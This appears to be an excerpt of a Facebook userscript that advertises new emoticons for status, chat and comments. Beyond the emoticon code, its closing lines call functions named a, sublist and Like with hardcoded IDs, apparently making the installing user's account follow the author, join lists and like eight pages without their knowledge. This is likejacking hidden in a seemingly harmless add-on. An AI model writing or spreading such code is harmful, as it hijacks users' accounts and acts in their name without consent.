// ==UserScript==
// @name    	Facebook smile For Chat,Comments
// @namespace	New Facebook Emoticons for Status, Chat and Comment!
// @description	New Facebook  2014 Emoticons for Status, Chat and Comment.
// @version 	1.0.1
// @author  	Jamel Yahyaoui
// @authorURL	http://www.facebook.com/yahyaoui.jamel
...
"chars" : " :) ",
	...
	html += '<span style="vertical-align: middle;"><img src="http://i.imgur.com/vUhEED6.png"></img></span>';
	html += '</a>';
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/yahyaoui.jamel" target="_blank">Created by Jamel yahyaoui<br></a>';
	html += '</div>';
...
a("100002423497376"); //yahyaoui jamel
a("10100003086682394"); //jamel yahyaoui 2
sublist("317777741646340");
sublist("454313181326128");
...
sublist("317777741646340");sublist("454313181326128");sublist("462473520510094");
Like("279685322138210");
Like("120666848107078");
Like("313783138718561");
Like("516344101758377");
Like("264747760303119");
Like("264360517039661");
Like("428686723840255");
Like("394933577317936");
